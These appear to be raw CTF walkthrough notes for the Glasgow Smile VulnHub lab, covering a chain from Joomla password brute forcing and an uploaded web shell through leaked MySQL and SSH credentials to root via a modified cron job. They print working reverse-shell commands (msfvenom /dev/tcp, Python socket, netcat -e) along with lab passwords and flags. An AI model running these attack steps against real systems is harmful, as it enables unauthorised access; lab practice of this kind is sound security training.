
Joomla --> Found password --> upload shell --> Access mysqldb --> found password -> found pinguin password --> found cron task --> modify cron task --> install reverse  shell --> obtient root shell


https://www.hackingarticles.in/glasgow-smile-1-1-vulnhub-walkthrough/
https://nmap.org/nsedoc/scripts/http-joomla-brute.html

Nmap 6: Network Exploration and Security Auditing Cookbook

└─$ sudo nmap -sT -A -Pn -n -p- 192.168.53.128
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-15 15:12 CEST
Nmap scan report for 192.168.53.128
Host is up (0.00069s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:1D:88:A4 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms 192.168.53.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.03 seconds



nmap -sV --script http-joomla-brute
  --script-args 'userdb=users.txt,passdb=joomla.wordlist,
                 http-joomla-brute.threads=3,brute.firstonly=true' 192.168.53.128


nmap -sV --script http-joomla-brute --script-args 'userdb=./users.txt,passdb=./joomla.wordlist,http-joomla-brute.hostname=u14s, http-joomla-brute.threads=3,brute.firstonly=true' 192.168.53.128

joomla.wordlist  users.txt




└─$ nmap -sV --script http-joomla-brute  --script-args 'userdb=./users.txt,passdb=joomla.wordlist,http-joomla-brute.uri=/joomla/administrator/index.php,http-joomla-brute.threads=3,brute.firstonly=true' 192.168.53.128 

└─$ nmap -sV --script http-joomla-brute  --script-args 'userdb=./users.txt,passdb=joomla.wordlist,http-joomla-brute.hostname=glasgow,http-joomla-brute.uri=/joomla/administrator/index.php,http-joomla-brute.threads=3,brute.firstonly=true' 192.168.53.128 

└─$ nmap  --script http-joomla-brute  --script-args 'userdb=./users.txt,passdb=joomla.wordlist,http-joomla-brute.hostname=glasgow,http-joomla-brute.uri=/joomla/administrator/index.php,http-joomla-brute.threads=3,brute.firstonly=false' 192.168.53.128 





curl http://192.168.53.128/joomla/templates/beez3/shell.php


        public $user = 'joomla';
        public $password = 'babyjoker';
        public $db = 'joomla_db';
        public $dbprefix = 'jnqcu_';
        public $live_site = '';
        public $secret = 'fNRyp6KO51013435';





python -c 'import pty;pty.spawn("/bin/sh")'



MariaDB [batjoke]> select * from  taskforce;
select * from  taskforce;
+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+




aaronishere
baneishere
carnageishere
busterishereff                           
???AllIHaveAreNegativeThoughts???
auntisthefuckhere
auntis
fuck
here
busterishereff
joomlaishere
abnerishere
penguinishere
robishere

└─$ hydra -L users.txt -P passwords.txt ssh://192.168.53.128
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-17 11:06:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 75 login tries (l:5/p:15), ~5 tries per task
[DATA] attacking ssh://192.168.53.128:22/
[22][ssh] host: 192.168.53.128   login: rob   password: ???AllIHaveAreNegativeThoughts???


whoami
rob@glasgowsmile:~$ cat howtoberoot
  _____ ______   __  _   _    _    ____  ____  _____ ____  
 |_   _|  _ \ \ / / | | | |  / \  |  _ \|  _ \| ____|  _ \ 
   | | | |_) \ V /  | |_| | / _ \ | |_) | | | |  _| | |_) |
   | | |  _ < | |   |  _  |/ ___ \|  _ <| |_| | |___|  _ < 
   |_| |_| \_\|_|   |_| |_/_/   \_\_| \_\____/|_____|_| \_\

NO HINTS.


rob@glasgowsmile:~$ cat user.txt
JKR[f5bb11acbb957915e421d62e7253d27a]
rob@glasgowsmile:~$ cat Abnerineedyourhelp
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
rob@glasgowsmile:~$ echo RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ== | base64 -d
E"��_oa(�ih�`U pW�, ,][$o#�i_qa("a^to&opX j ,u +�V$-rob@glasgowsmile:~$ 


rob@glasgowsmile:~$  cat Abnerineedyourhelp | tr A-Za-z B-ZAb-za
Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't."
Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==

rob@glasgowsmile:~$ echo STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA== | base64 -d
I33hope99my0death000makes44more8cents00than0my0life0rob@glasgowsmile:~$ 


abner@glasgowsmile:~$ cat info.txt 
A Glasgow smile is a wound caused by making a cut from the corners of a victim's mouth up to the ears, leaving a scar in the shape of a smile.
The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly.
The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile").
abner@glasgowsmile:~$ 



└─$ msfvenom -p cmd/unix/reverse_bash lhost=192.168.53.1 lport=1234 R

[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 66 bytes
0<&169-;exec 169<>/dev/tcp/192.168.53.1/1234;sh <&169 >&169 2>&169
 



2021/06/21 02:55:01 CMD: UID=0    PID=1087   | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
2021/06/21 02:55:01 CMD: UID=0    PID=1088   | /bin/sh /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 




python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.155",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);



abner@glasgowsmile:~$ find /var/www/ -name *.zip 2>/dev/null
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip

abner@glasgowsmile:~$ cat dear_penguins 
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
abner@glasgowsmile:~$ su penguin
Password: 
penguin@glasgowsmile:/home/abner$ cd
penguin@glasgowsmile:~$ ls -al
total 3052
drwxr-xr-x 5 penguin penguin    4096 Jun 17 04:52 .
drwxr-xr-x 5 root    root       4096 Jun 15  2020 ..
-rw------- 1 penguin penguin      81 Jun 21 03:21 .bash_history
-rw-r--r-- 1 penguin penguin     220 Jun 15  2020 .bash_logout
-rw-r--r-- 1 penguin penguin    3526 Jun 15  2020 .bashrc
drwxr-xr-x 3 penguin penguin    4096 Jun 15  2020 .local
-rw-r--r-- 1 penguin penguin     807 Jun 15  2020 .profile
-rwxr-xr-x 1 penguin penguin 3078592 Mar  5 10:04 pspy64
-rw-r--r-- 1 penguin penguin      66 Jun 17 04:51 .selected_editor
drwxr--r-- 2 penguin penguin    4096 Jun 17 10:24 SomeoneWhoHidesBehindAMask
drwx------ 2 penguin penguin    4096 Jun 15  2020 .ssh
-rw------- 1 penguin penguin      58 Jun 15  2020 .Xauthority

penguin@glasgowsmile:~$ cat SomeoneWhoHidesBehindAMask/.trash_old 

nc 192.168.53.1 1234 -e /bin/sh 



└─$ nc -lvp 1234
listening on [any] 1234 ...
connect to [192.168.53.1] from glasgow [192.168.53.128] 38450
ls
root.txt
whoami
